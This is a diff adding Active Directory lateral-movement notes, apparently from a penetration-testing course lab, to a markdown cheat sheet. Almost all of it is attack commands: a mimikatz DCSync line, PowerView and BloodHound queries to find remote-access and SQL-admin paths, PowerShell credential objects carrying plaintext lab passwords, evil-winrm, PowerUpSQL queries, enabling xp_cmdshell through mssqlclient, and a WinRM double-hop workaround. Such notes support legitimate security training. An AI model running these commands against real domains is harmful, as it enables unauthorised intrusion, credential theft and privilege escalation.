@@ -443,3 +443,64 @@ mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\admin
 ```powershell
 Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 ```
+
+## RDP
+### WINRM
+```powershell
+import-module .\powerview.ps1
+
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+```
+```
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+```
+```powershell
+$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+
+$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+
+Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+```
+```bash
+evil-winrm -i 10.129.201.234 -u forend
+```
+
+### SQL Server Admin
+```
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+```
+```powershell
+Import-Module .\PowerUpSQL.ps1
+
+Get-SQLInstanceDomain
+
+Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+```
+```
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+
+SQL> enable_xp_cmdshell
+```
+
+## Double Hop Problem
+```powershell
+# WINRM
+import-module .\powerview.ps1
+
+$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
+
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
+
+get-domainuser -spn -credential $Cred | select samaccountname
+
+klist
+```
+```powershell
+Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
+
+Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
+
+restart-service winrm
+
+Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
+```
